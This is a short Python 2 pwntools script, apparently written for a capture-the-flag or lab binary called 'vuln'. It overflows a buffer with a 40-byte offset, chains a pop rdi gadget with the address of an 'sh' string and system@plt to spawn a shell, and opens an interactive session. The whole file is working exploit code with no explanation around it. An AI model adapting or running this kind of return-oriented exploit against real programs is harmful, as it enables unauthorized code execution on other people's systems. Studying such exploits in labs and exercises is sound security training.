#!/usr/bin/env python2

import sys
from pwn import *

e = ELF("vuln")
#hidden_address = e.symbols["hidden"]
system_plt_address = e.plt["system"] + 4 # XXX
sh_address = e.symbols["sh"]
pop_rdi_ret = 0x400623
print "plt_address: 0x{:016x}".format(system_plt_address)
print "sh: 0x{:016x}".format(sh_address)

offset = 40
payload = offset * "A" + p64(pop_rdi_ret) + p64(sh_address) + p64(system_plt_address)
print "".join("\\x{:02x}".format(ord(i)) for i in payload)

io = process("./vuln")
#gdb.attach(io)
io.sendline(payload)
io.interactive()
